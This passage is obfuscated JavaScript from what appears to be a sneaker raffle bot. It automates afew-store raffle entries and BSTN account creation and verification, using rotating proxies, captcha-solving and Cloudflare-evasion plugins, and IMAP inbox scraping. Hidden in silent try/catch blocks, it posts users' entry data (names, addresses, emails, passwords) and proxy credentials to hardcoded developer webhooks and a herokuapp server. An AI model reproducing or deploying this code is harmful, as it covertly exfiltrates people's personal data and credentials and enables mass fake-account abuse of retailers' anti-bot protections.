                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2e1be9 = await _0x555941['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5ad775[0x0] + ':' + _0x5ad775[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x911b6d = JSON['parse'](_0x25647b['readFileSync']('sizes.json', 'utf-8')), _0x241d48 = _0x4003bb[_0x25b76d]['Url'], _0x387cdb = _0x4003bb[_0x25b76d]['Size'], _0x98dbd2;
                        async function _0x356cac() {
                            var _0x14b677 = new _0x5bf540['CookieJar']();
                            console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x56dbc0;
                            let _0x591413 = {
                                'method': 'GET',
                                'cookieJar': _0x14b677,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x5ad775[0x2] + ':' + _0x5ad775[0x3] + '@' + _0x5ad775[0x0] + ':' + _0x5ad775[0x1]
                            }, _0x5e6c87 = _0x241d48['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x4ae944 = _0x5e6c87 + '.json', _0x32ed12 = await _0x20b5bc(_0x4ae944);
                            console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x503652 = _0x32ed12['data']['product']['variants'];
                            if (_0x387cdb != 'RANDOM') {
                                if (_0x503652[0x1]['option1']['includes']('W')) {
                                    const _0x57a233 = _0x911b6d['women']['find'](_0x5a25d5 => _0x5a25d5['EUsize'] === _0x387cdb);
                                    _0x57a233 && (_0x387cdb = _0x57a233['size']);
                                } else {
                                    if (_0x503652[0x1]['option1']['includes']('Y')) {
                                        const _0x4ec520 = _0x911b6d['GS']['find'](_0x553b34 => _0x553b34['EUsize'] === _0x387cdb);
                                        _0x4ec520 && (_0x387cdb = _0x4ec520['size']);
                                    } else {
                                        const _0x4d4144 = _0x911b6d['men']['find'](_0x3d225a => _0x3d225a['EUsize'] === _0x387cdb);
                                        _0x4d4144 && (_0x387cdb = _0x4d4144['size']);
                                    }
                                }
                                for (var _0x4d1b46 of _0x503652) {
                                    _0x4d1b46['option1'] == _0x387cdb && (_0x56dbc0 = _0x4d1b46['id']);
                                }
                            } else {
                                var _0x105b39 = Math['round'](Math['random']() * (_0x503652['length'] - 0x1));
                                _0x56dbc0 = _0x503652[_0x105b39]['id'];
                            }
                            console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x20b5bc('https://raffles.afew-store.com/cart/' + _0x56dbc0 + ':1'), _0x98dbd2 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x356cac();
                        } catch (_0x5da468) {
                            if (_0x5da468['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x5da468);
                        }
                        const _0x73bee5 = await _0x2e1be9['newPage']();
                        await _0x73bee5['setDefaultNavigationTimeout'](0x1d4c0), await _0x73bee5['authenticate']({
                            'username': '' + _0x5ad775[0x2],
                            'password': '' + _0x5ad775[0x3]
                        }), await _0x73bee5['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x73bee5['setRequestInterception'](!![]), _0x73bee5['on']('request', _0x53da2b => {
                            _0x53da2b['resourceType']() === 'image' || _0x53da2b['resourceType']() === 'font' || _0x53da2b['resourceType']() === 'media' ? _0x53da2b['abort']() : _0x53da2b['continue']();
                        });
                        try {
                            await _0x73bee5['goto'](_0x98dbd2, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x73bee5['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x73bee5['type']('#checkout_email', '' + _0x4003bb[_0x25b76d]['Email']), await _0x63aa6a(0x320), await _0x73bee5['type']('#checkout_attributes_instagram', '' + _0x4003bb[_0x25b76d]['Follower']), await _0x63aa6a(0x320), await _0x73bee5['select']('#checkout_shipping_address_country', '' + _0x4003bb[_0x25b76d]['Country']), await _0x73bee5['waitForTimeout'](0x258), await _0x73bee5['type']('#checkout_shipping_address_first_name', '' + _0x4003bb[_0x25b76d]['FirstName']), await _0x73bee5['waitForTimeout'](0x320), await _0x73bee5['type']('#checkout_shipping_address_last_name', '' + _0x4003bb[_0x25b76d]['LastName']), await _0x73bee5['waitForTimeout'](0x2bc), await _0x73bee5['type']('#checkout_shipping_address_address1', _0x4003bb[_0x25b76d]['Address1'] + '\x20' + _0x4003bb[_0x25b76d]['HouseNumber']), await _0x73bee5['waitForTimeout'](0x2bc), await _0x73bee5['type']('#checkout_shipping_address_address2', '' + _0x4003bb[_0x25b76d]['Address2']), await _0x73bee5['waitForTimeout'](0x2bc), await _0x73bee5['type']('#checkout_shipping_address_zip', '' + _0x4003bb[_0x25b76d]['Zip']), await _0x73bee5['waitForTimeout'](0x2bc), await _0x73bee5['type']('#checkout_shipping_address_city', '' + _0x4003bb[_0x25b76d]['City']), await _0x73bee5['waitForTimeout'](0x2bc);
                        if (_0x4003bb[_0x25b76d]['State'] != '')
                            try {
                                const _0xc13cd = JSON['parse'](_0x25647b['readFileSync']('States.json', 'utf8'));
                                await _0x63aa6a(0x1f4);
                                if (_0x4003bb[_0x25b76d]['State']['length'] > 0x2)
                                    for (let _0x1ed40f of _0xc13cd) {
                                        if (_0x1ed40f['Province'] == _0x4003bb[_0x25b76d]['State']) {
                                            await _0x73bee5['select']('#checkout_shipping_address_province', _0x1ed40f['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x73bee5['select']('#checkout_shipping_address_province', _0x4003bb[_0x25b76d]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x63aa6a(0x1f4), console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x63aa6a(0x190), _0x73bee5['evaluate'](() => {
                            const _0xc36a10 = document['querySelector']('#continue_button');
                            for (var _0x2f890f = 0x0; _0x2f890f < 0x5; _0x2f890f++) {
                                if (_0xc36a10) {
                                    _0xc36a10['click'](), _0xc36a10['click']();
                                    break;
                                } else
                                    _0x63aa6a(0xfa0);
                            }
                        }), await _0x73bee5['waitForTimeout'](0x9c4);
                        try {
                            await _0x73bee5['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x73bee5['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x4ac904 => _0x4ac904['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x73bee5['waitForTimeout'](0x7d0), console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x73bee5['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x63aa6a(0x3e8), await _0x73bee5['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x32f620 => _0x32f620['submit']()), await _0x63aa6a(0x3e8);
                        try {
                            await _0x73bee5['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x73bee5['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x392006 => _0x392006['submit']());
                        try {
                            await _0x73bee5['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x2a71e9 = 'no', _0x1ab0d7(_0x4003bb[_0x25b76d], _0x3abdd4), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                                try {
                                    await _0x56185b(_0x2ab3b9['webhook'], _0x4f95b8['succesDEVMSG']);
                                } catch {
                                }
                            await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x4f95b8['succesDEVMSG']), await _0x63aa6a(0xc8);
                            try {
                                await _0x56185b(_0x595b38, _0x4f95b8['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x484f45['replace']('#', ''),
                                    'module': _0x3abdd4['name'],
                                    'entrydata': JSON['stringify'](_0x3367ed),
                                    'proxy': '' + _0x5177ed[_0x25b76d]
                                };
                                var _0x49812c = JSON['stringify'](prxdata);
                                let _0x3cd2b6 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x49812c, _0x3cd2b6);
                            } catch (_0x11f5ff) {
                            }
                        } catch (_0x412582) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x243da4) {
                        _0x243da4['message']['includes']('selector') && (_0x243da4 = 'Connection\x20Error');
                        console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20' + _0x243da4)), _0x1cf9b4 = '' + _0x243da4;
                        var _0x4adbdb = await _0x198507(_0x4003bb[_0x25b76d], _0x3abdd4, 'dev', !![], _0x1cf9b4);
                        _0x4f95b8['errorDEV'] = { 'embeds': [_0x4adbdb] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x4f95b8['errorDEV']), await _0x56185b(_0x3c02fa, _0x4f95b8['errorDEV']), _0x2a71e9 = 'yes';
                    } finally {
                        _0x2e1be9 && _0x2e1be9['close']();
                        if (_0x2a71e9 == 'yes' && _0x3dd644 != 0x5 && _0x1cf9b4 != 'Size\x20Not\x20Found') {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Retrying\x20(' + _0x3dd644 + '\x20/\x205)')), _0x25b76d = _0x25b76d - 0x1, _0x3dd644 = _0x3dd644 + 0x1;
                            continue;
                        }
                        _0x2a71e9 == 'yes' && _0x3dd644 >= 0x5 && (_0x11ea8b(_0x4003bb[_0x25b76d], _0x3abdd4), _0x2a71e9 = 'no', _0x3dd644 = 0x0);
                        if (_0x25b76d + 0x1 == _0x4003bb['length']) {
                            await _0x63aa6a(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x2ab3b9['AfewDelay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4de5ba, _0x765229, _0x562018) {
                    var _0x2d7fbb = _0x765229, _0x66ce52 = 0x0;
                    for (var _0x572f97 = 0x0; _0x572f97 < _0x765229['length']; _0x572f97++) {
                        maxTasks = Number(_0x2ab3b9['threads']);
                        while (_0x66ce52 >= maxTasks) {
                            await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                        async function _0x59e989(_0x499f68, _0x405ea6, _0x4d5830, _0x392db0, _0x20ff98) {
                            _0x66ce52++, _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2ab3b9['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x7b4b3d;
                            try {
                                await _0x5921e0(_0x405ea6, _0x392db0);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x9474bc(_0x499f68['name'] + '\x20Task\x20' + (_0x392db0 + 0x1) + '\x20/\x20' + _0x405ea6['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                            var _0x37ec45 = await _0x198507(_0x405ea6[_0x392db0], _0x499f68, 'acc', ![]);
                            const _0x2b6bd5 = { 'succesDEVMSG': { 'embeds': [_0x37ec45] } }, _0x367ad7 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x3c91d9 = Math['round'](Math['random']() * (_0x4d5830['length'] - 0x1)), _0x1e404b = _0x4d5830[_0x3c91d9]['split'](':'), _0x4db29b;
                            try {
                                _0x4db29b = await _0x555941['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1e404b[0x0] + ':' + _0x1e404b[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4db29b = await _0x555941['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1e404b[0x0] + ':' + _0x1e404b[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x23d2ba = await _0x4db29b['newPage']();
                                await _0x23d2ba['authenticate']({
                                    'username': '' + _0x1e404b[0x2],
                                    'password': '' + _0x1e404b[0x3]
                                }), console['log'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x23d2ba['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x23d2ba['setRequestInterception'](!![]), _0x23d2ba['on']('request', _0xb3841b => {
                                    _0xb3841b['resourceType']() === 'image' ? _0xb3841b['abort']() : _0xb3841b['continue']();
                                });
                                try {
                                    await _0x23d2ba['goto']('' + _0x367ad7), await _0x23d2ba['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x23d2ba['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x63aa6a(0x7d0), console['log'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x63aa6a(0x190), await _0x23d2ba['waitForSelector']('#firstname'), await _0x23d2ba['focus']('#firstname'), await _0x23d2ba['keyboard']['down']('Control'), await _0x23d2ba['keyboard']['press']('A'), await _0x63aa6a(0xc8), await _0x23d2ba['keyboard']['up']('Control'), await _0x23d2ba['keyboard']['press']('Backspace'), await _0x23d2ba['type']('#firstname', _0x405ea6[_0x392db0]['FirstName'], { 'delay': 0xf0 }), await _0x63aa6a(0x190), await _0x23d2ba['focus']('#lastname'), await _0x23d2ba['keyboard']['down']('Control'), await _0x23d2ba['keyboard']['press']('A'), await _0x63aa6a(0xc8), await _0x23d2ba['keyboard']['up']('Control'), await _0x23d2ba['keyboard']['press']('Backspace'), await _0x23d2ba['type']('#lastname', _0x405ea6[_0x392db0]['LastName'], { 'delay': 0xe6 }), await _0x63aa6a(0x190), await _0x23d2ba['focus']('#email_address'), await _0x23d2ba['keyboard']['down']('Control'), await _0x23d2ba['keyboard']['press']('A'), await _0x63aa6a(0xc8), await _0x23d2ba['keyboard']['up']('Control'), await _0x23d2ba['keyboard']['press']('Backspace'), await _0x23d2ba['type']('#email_address', _0x405ea6[_0x392db0]['Email'], { 'delay': 0x122 }), await _0x63aa6a(0x190), await _0x23d2ba['type']('#password', _0x405ea6[_0x392db0]['Password'], { 'delay': 0x82 }), await _0x63aa6a(0x1f4), await _0x23d2ba['type']('#password-confirmation', _0x405ea6[_0x392db0]['Password'], { 'delay': 0x7c }), console['log'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x63aa6a(0x2bc), await _0x23d2ba['$eval']('#form-validate', _0x2e8045 => _0x2e8045['submit']()), await _0x63aa6a(0x1388);
                                const _0x79a901 = await _0x23d2ba['$']('#email_address-error');
                                if (_0x79a901)
                                    throw new Error('Invalid\x20Email');
                                const _0x989d34 = await _0x23d2ba['$']('#password-error');
                                if (_0x989d34)
                                    throw new Error('Invalid\x20Password');
                                await _0x23d2ba['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20Account\x20' + _0x405ea6[_0x392db0]['Email'] + '\x20Generated')), _0x25647b['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x405ea6[_0x392db0]['Email'] + ',' + _0x405ea6[_0x392db0]['Password']);
                                try {
                                    _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x2b6bd5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x56185b(_0x46e741, _0x2b6bd5['succesDEVMSG']);
                                let _0x120ef9 = _0x405ea6[_0x392db0];
                                try {
                                    prxdata = {
                                        'username': _0x484f45['replace']('#', ''),
                                        'module': _0x499f68['name'],
                                        'entrydata': JSON['stringify'](_0x120ef9),
                                        'proxy': '' + _0x4d5830[_0x392db0]
                                    };
                                    var _0x3470a0 = JSON['stringify'](prxdata);
                                    let _0x4ba9cd = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x3470a0, _0x4ba9cd);
                                } catch (_0x2607f9) {
                                }
                                console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x979d1a) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20' + _0x979d1a)), _0x7b4b3d = '' + _0x979d1a;
                                var _0x307395 = await _0x198507(_0x405ea6[_0x392db0], _0x499f68, 'acc', !![], _0x7b4b3d);
                                _0x2b6bd5['errorDEV'] = { 'embeds': [_0x307395] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x2b6bd5['errorDEV']), await _0x56185b(_0x3c02fa, _0x2b6bd5['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x4db29b)
                                    _0x4db29b['close']();
                                if (retry == 'yes' && _0x20ff98 != 0x5)
                                    return console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Task\x20' + (_0x392db0 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x20ff98 + 0x1) + '\x20/\x205)')), _0x66ce52--, _0x20ff98 = _0x20ff98 + 0x1, _0x59e989(_0x499f68, _0x405ea6, _0x4d5830, _0x392db0, _0x20ff98);
                                retry == 'yes' && _0x20ff98 >= 0x5 && (_0x11ea8b(_0x405ea6[_0x392db0], _0x499f68), retry = 'no', _0x20ff98 = 0x0), _0x66ce52--, console['log'](_0x2bc944() + '\x20[' + _0x499f68['name'] + ']\x20Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                            }
                        }
                        _0x59e989(_0x4de5ba, _0x2d7fbb, _0x562018, _0x572f97, 0x0), await _0x63aa6a(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x27453c, _0x4a38a0) {
                    var _0x27463e = ![], _0x5f5738 = [], _0xa80cbb = 0x0;
                    async function _0x5b915f() {
                        var _0x10f915 = new _0x117139({
                            'user': _0x2ab3b9['masterMail'],
                            'password': _0x2ab3b9['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x646986(_0x20ab3e) {
                            _0x10f915['openBox']('INBOX', ![], _0x20ab3e);
                        }
                        _0x10f915['once']('ready', function () {
                            _0x646986(function (_0x502603, _0x55eb5b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x502603)
                                    throw _0x502603;
                                _0x10f915['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0xadf0dc, _0x63fb35) {
                                    if (!_0x63fb35 || !_0x63fb35['length'])
                                        console['log'](_0x2bc944() + '\x20[' + _0x27453c['name'] + ']\x20No\x20mails\x20found'), _0x10f915['end']();
                                    else {
                                        var _0x49c578 = _0x10f915['seq']['fetch'](_0x63fb35, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x49c578['on']('message', function (_0x1a2cb9, _0x25e03d) {
                                            var _0xefb6f0 = '(#' + _0x25e03d + ')\x20';
                                            _0x1a2cb9['on']('body', function (_0x252ebd, _0x5f2d1c) {
                                                _0x414931(_0x252ebd, (_0x3c1682, _0x2532b3) => {
                                                    var _0x33a3fd = _0x2532b3['text']['split']('customer/account/confirm/')[0x1], _0x183352 = _0x33a3fd['split'](']')[0x0];
                                                    _0x5f5738['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x183352);
                                                });
                                            }), _0x1a2cb9['once']('end', function () {
                                            });
                                        }), _0x49c578['once']('error', function (_0x5088a4) {
                                            console['log']('Fetch\x20error:\x20' + _0x5088a4), _0x27463e = !![];
                                        }), _0x49c578['once']('end', function () {
                                            _0x10f915['end'](), _0x27463e = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x10f915['once']('error', function (_0x1bb393) {
                            console['log'](_0x49a6ed['red'](_0x1bb393['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x27463e = !![];
                        }), _0x10f915['once']('end', async function () {
                            _0x27463e = !![];
                        }), _0x10f915['connect']();
                    }
                    try {
                        _0x5b915f();
                        while (!_0x27463e) {
                            await _0x63aa6a(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5f5738['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x63aa6a(0x7d0);
                    }
                    for (var _0x13efe8 = 0x0; _0x13efe8 < _0x5f5738['length']; _0x13efe8++) {
                        maxTasks = Number(_0x2ab3b9['threads']);
                        while (_0xa80cbb >= maxTasks) {
                            await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                        async function _0x301387(_0x3230ee, _0x1ba52a, _0x3024f8, _0xb5b7f4, _0x5c7d70) {
                            _0xa80cbb++, _0x555941['use'](_0x13dc37());
                            if (_0xb396f != 'yes')
                                var _0xb396f = '', _0x5c7d70 = 0x0;
                            var _0x10932b = Math['round'](Math['random']() * (_0x3024f8['length'] - 0x1)), _0x462903 = _0x3024f8[_0x10932b]['split'](':'), _0x24b8d9;
                            try {
                                _0x24b8d9 = await _0x555941['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x462903[0x0] + ':' + _0x462903[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x24b8d9 = await _0x555941['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x462903[0x0] + ':' + _0x462903[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x2a393d = await _0x24b8d9['newPage']();
                                await _0x2a393d['authenticate']({
                                    'username': '' + _0x462903[0x2],
                                    'password': '' + _0x462903[0x3]
                                }), console['log'](_0x2bc944() + '\x20[' + _0x3230ee['name'] + ']\x20Task\x20' + (_0xb5b7f4 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x2a393d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2a393d['setRequestInterception'](!![]), _0x2a393d['on']('request', _0x496705 => {
                                    _0x496705['resourceType']() === 'image' || _0x496705['resourceType']() === 'font' || _0x496705['resourceType']() === 'media' ? _0x496705['abort']() : _0x496705['continue']();
                                }), console['log'](_0x2bc944() + '\x20[' + _0x3230ee['name'] + ']\x20Task\x20' + (_0xb5b7f4 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x2a393d['goto'](_0x1ba52a[_0xb5b7f4]);
                                } catch (_0x55a9b8) {
                                    _0xb396f = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x55a9b8);
                                }
                                console['log'](_0x2bc944() + '\x20[' + _0x3230ee['name'] + ']\x20Task\x20' + (_0xb5b7f4 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2a393d['waitForTimeout'](0xbb8);
                                try {
                                    await _0x2a393d['waitForSelector']('.account-nav'), _0xb396f = 'no', console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x3230ee['name'] + ']\x20Task\x20' + (_0xb5b7f4 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x4c34c1 = await _0x198507(null, _0x3230ee, 'ver', ![]);
                                    const _0x2d5d99 = { 'succesDEVMSG': { 'embeds': [_0x4c34c1] } };
                                    await _0x56185b(_0x2d4b5a, _0x2d5d99['succesDEVMSG']);
                                } catch {
                                    _0xb396f = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x281edb) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3230ee['name'] + ']\x20Task\x20' + (_0xb5b7f4 + 0x1) + '\x20:\x20' + _0x281edb));
                                var _0x3bac73 = _0x281edb, _0x4e39e4 = await _0x198507(null, _0x3230ee, 'ver', !![], _0x3bac73);
                                const _0x5e227f = { 'errorDEVMSG': { 'embeds': [_0x4e39e4] } };
                                _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x5e227f['errorDEVMSG']), await _0x56185b(_0x3c02fa, _0x5e227f['errorDEVMSG']);
                            } finally {
                                if (_0x24b8d9)
                                    _0x24b8d9['close']();
                                if (_0xb396f == 'yes' && _0x5c7d70 != 0x5)
                                    return console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3230ee['name'] + ']\x20Task\x20' + (_0xb5b7f4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5c7d70 + '\x20/\x205)')), _0xa80cbb--, _0x5c7d70 = _0x5c7d70 + 0x1, _0x301387(_0x3230ee, _0x1ba52a, _0x3024f8, _0xb5b7f4, _0x5c7d70);
